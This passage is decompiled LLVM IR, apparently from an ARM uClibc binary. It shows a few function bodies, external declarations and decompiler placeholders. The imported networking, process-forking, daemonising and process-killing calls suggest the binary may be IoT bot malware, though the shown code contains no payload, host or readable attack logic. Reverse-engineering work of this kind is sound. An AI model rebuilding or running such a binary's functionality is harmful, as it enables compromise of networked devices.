  store i32 ptrtoint (i32* @global_var_1a204.376 to i32), i32* %r4.global-to-local, align 4
  br i1 %v2_11fe0, label %bb, label %.preheader

bb:                                               ; preds = %dec_label_pc_11fd8
  store i32 %v3_11fe4, i32* %r4.global-to-local, align 4
  %v9_11fec = load i32, i32* @r0, align 4
  ret i32 %v9_11fec

.preheader:                                       ; preds = %dec_label_pc_11fd8, %.preheader
  %v0_11ff4 = phi i32 [ %v3_11ff8, %.preheader ], [ %v3_11fdc, %dec_label_pc_11fd8 ]
  call void @__pseudo_branch(i32 %v0_11ff4)
  %v0_11ff8 = load i32, i32* %r4.global-to-local, align 4
  %v1_11ff8 = add i32 %v0_11ff8, -4
  %v2_11ff8 = inttoptr i32 %v1_11ff8 to i32*
  %v3_11ff8 = load i32, i32* %v2_11ff8, align 4
  store i32 %v1_11ff8, i32* %r4.global-to-local, align 4
  %v3_11ffc = icmp eq i32 %v3_11ff8, -1
  br i1 %v3_11ffc, label %dec_label_pc_12004, label %.preheader

dec_label_pc_12004:                               ; preds = %.preheader
  %v2_12004 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12004, i32* %r4.global-to-local, align 4
  %v8_12004 = load i32, i32* @r0, align 4
  ret i32 %v8_12004

; uselistorder directives
  uselistorder i32 %v3_11ff8, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32 -4, { 4, 0, 1, 3, 2 }
  uselistorder i32 -1, { 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 0, 1, 2, 25, 28, 29, 3, 52, 53, 54, 168, 169, 55, 56, 57, 58, 59, 60, 61, 165, 166, 62, 63, 64, 65, 66, 67, 68, 69, 70, 163, 30, 164, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 167, 85, 4, 86, 87, 5, 88, 89, 90, 91, 92, 31, 170, 93, 94, 171, 95, 96, 6, 34, 172, 36, 173, 97, 35, 174, 7, 98, 99, 100, 37, 175, 8, 101, 102, 103, 104, 105, 14, 106, 107, 108, 9, 33, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 15, 122, 123, 124, 125, 126, 127, 16, 128, 129, 130, 17, 131, 132, 133, 18, 135, 134, 12, 136, 137, 19, 139, 138, 13, 140, 141, 20, 142, 143, 144, 145, 21, 32, 146, 147, 22, 148, 149, 150, 23, 151, 152, 153, 24, 154, 155, 156, 10, 26, 11, 27, 38, 157, 158, 159, 160, 161, 162, 39, 40, 41 }
  uselistorder i32 1, {}
  uselistorder label %.preheader, { 1, 0 }
}

define i32 @function_1200c() local_unnamed_addr {
dec_label_pc_1200c:
  %v5_12010 = load i32, i32* @r0, align 4
  ret i32 %v5_12010

; uselistorder directives
  uselistorder i32* @r0, { 5, 7, 8, 11, 76, 12, 77, 13, 78, 15, 14, 9, 46, 0, 10, 47, 48, 2, 19, 20, 21, 24, 25, 26, 27, 28, 3, 22, 23, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 49, 50, 51, 52, 53, 54, 55, 1, 56, 57, 58, 59, 60, 61, 62, 73, 74, 4, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 75, 6, 16, 17, 18 }
}

define i32 @function_12014() local_unnamed_addr {
entry:
  %v3_12018 = load i32, i32* @r4, align 4
  %v0_12020 = call i32 @function_8dac()
  call void @__pseudo_branch(i32 %v3_12018)
  ret i32 %v0_12020

; uselistorder directives
  uselistorder void (i32)* @__pseudo_branch, { 1, 6, 8, 9, 10, 2, 3, 4, 0, 5, 7 }
  uselistorder i32 0, {}
  uselistorder i32* @r4, {}
}

declare i8* @strcpy(i8*, i8*) local_unnamed_addr

declare i32 @ioctl(i32, i32, ...) local_unnamed_addr

declare i32 @recv(i32, i32*, i32, i32) local_unnamed_addr

declare i32 @connect(i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @sigemptyset(%_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32* @memmove(i32*, i32*, i32) local_unnamed_addr

declare i32 @getpid() local_unnamed_addr

declare i32 @prctl(i32, i32, i32, i32, i32) local_unnamed_addr

declare i32* @memcpy(i32*, i32*, i32) local_unnamed_addr

declare i32 @readlink(i8*, i8*, i32) local_unnamed_addr

declare i32* @malloc(i32) local_unnamed_addr

declare i32 @sleep(i32) local_unnamed_addr

declare i32 @recvfrom(i32, i32*, i32, i32, %sockaddr*, i32*) local_unnamed_addr

declare i32 @socket(i32, i32, i32) local_unnamed_addr

declare i32 @select(i32, %_TYPEDEF_fd_set*, %_TYPEDEF_fd_set*, %_TYPEDEF_fd_set*, %timeval*) local_unnamed_addr

declare %dirent* @readdir(%__dirstream*) local_unnamed_addr

declare i32 @sigaddset(%_TYPEDEF_sigset_t*, i32) local_unnamed_addr

declare i32 @send(i32, i32*, i32, i32) local_unnamed_addr

declare void @abort() local_unnamed_addr

declare i32* @calloc(i32, i32) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @kill(i32, i32) local_unnamed_addr

declare i32 @bind(i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @inet_addr(i8*) local_unnamed_addr

declare i32 @setsockopt(i32, i32, i32, i32*, i32) local_unnamed_addr

declare void (i32)* @signal(i32, void (i32)*) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @unlink(i8*) local_unnamed_addr

declare i32 @sendto(i32, i32*, i32, i32, %sockaddr*, i32) local_unnamed_addr

declare i32* @realloc(i32*, i32) local_unnamed_addr

declare i32 @listen(i32, i32) local_unnamed_addr

declare i32 @fork() local_unnamed_addr

declare i32 @__uClibc_main() local_unnamed_addr

declare i32* @memset(i32*, i32, i32) local_unnamed_addr

declare i32 @getppid() local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare %__dirstream* @opendir(i8*) local_unnamed_addr

declare i32 @getsockopt(i32, i32, i32, i32*, i32*) local_unnamed_addr

declare i32* @__errno_location() local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @atoi(i8*) local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @clock() local_unnamed_addr

declare i32 @setsid() local_unnamed_addr

declare i32 @closedir(%__dirstream*) local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare void @free(i32*) local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @getsockname(i32, %sockaddr*, i32*) local_unnamed_addr

define i32 @__data_start(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_1a38c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1a38c, label %bb, label %bb1

bb:                                               ; preds = %entry
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  ret i32 %arg1

; uselistorder directives
  uselistorder i1 false, { 0, 11, 1, 24, 15, 28, 25, 23, 26, 2, 3, 4, 5, 6, 14, 7, 13, 8, 12, 9, 10, 16, 17, 18, 27, 19, 20, 22, 21, 29 }
  uselistorder i1* @cpsr_z, { 5, 1, 2, 0, 3, 4 }
  uselistorder label %bb1, { 1, 0 }
}

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8 @__decompiler_undefined_function_1() local_unnamed_addr

declare %sockaddr* @__decompiler_undefined_function_2() local_unnamed_addr

declare i8* @__decompiler_undefined_function_3() local_unnamed_addr

declare %timeval* @__decompiler_undefined_function_4() local_unnamed_addr

declare i32* @__decompiler_undefined_function_5() local_unnamed_addr

declare %_TYPEDEF_fd_set* @__decompiler_undefined_function_6() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
